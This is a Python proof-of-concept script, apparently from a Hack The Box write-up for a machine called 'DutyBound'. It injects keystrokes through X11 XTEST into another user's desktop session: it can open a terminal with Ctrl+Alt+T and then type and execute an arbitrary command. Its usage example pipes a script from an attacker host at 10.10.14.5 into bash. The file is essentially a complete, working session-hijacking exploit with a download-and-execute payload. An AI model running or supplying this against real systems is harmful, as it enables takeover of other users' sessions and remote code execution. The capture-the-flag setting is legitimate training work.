#!/usr/bin/env python3
"""DutyBound (HTB) - X11 XTEST keystroke injection into another user's session.

Source: dutybound.txt

Run on the target (as a user able to open DISPLAY :0), e.g.:
    python3 poc_htb_x11_type.py --open-xterm
    python3 poc_htb_x11_type.py 'curl http://10.10.14.5:8000/user.sh|bash'

--open-xterm sends Ctrl+Alt+T (Openbox default binding) first.
"""
import argparse
import time

from Xlib import X, XK, display
from Xlib.ext import xtest

NAMES = {" ": "space", ":": "colon", "/": "slash", ".": "period",
         "|": "bar", "-": "minus", "_": "underscore", "=": "equal",
         "'": "apostrophe", '"': "quotedbl", ";": "semicolon"}


def key(d, name, down):
    code = d.keysym_to_keycode(XK.string_to_keysym(name))
    if not code:
        raise ValueError(f"no keycode for {name!r}")
    xtest.fake_input(d, X.KeyPress if down else X.KeyRelease, code)


def tap(d, char):
    sym = XK.string_to_keysym(NAMES.get(char, char))
    code = d.keysym_to_keycode(sym)
    if not code:
        raise ValueError(f"no keycode for {char!r}")
    shifted = d.keycode_to_keysym(code, 0) != sym
    shift = d.keysym_to_keycode(XK.string_to_keysym("Shift_L"))
    if shifted:
        xtest.fake_input(d, X.KeyPress, shift)
    xtest.fake_input(d, X.KeyPress, code)
    xtest.fake_input(d, X.KeyRelease, code)
    if shifted:
        xtest.fake_input(d, X.KeyRelease, shift)
    d.sync()
    time.sleep(0.03)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("text", nargs="?", help="command line to type")
    ap.add_argument("--display", default=":0")
    ap.add_argument("--open-xterm", action="store_true")
    args = ap.parse_args()

    d = display.Display(args.display)
    if args.open_xterm:
        key(d, "Control_L", True)
        key(d, "Alt_L", True)
        key(d, "t", True)
        key(d, "t", False)
        key(d, "Alt_L", False)
        key(d, "Control_L", False)
        d.sync()
        time.sleep(1)

    if args.text:
        for ch in args.text:
            tap(d, ch)
        tap(d, "Return")
        print("[+] typed")


if __name__ == "__main__":
    main()
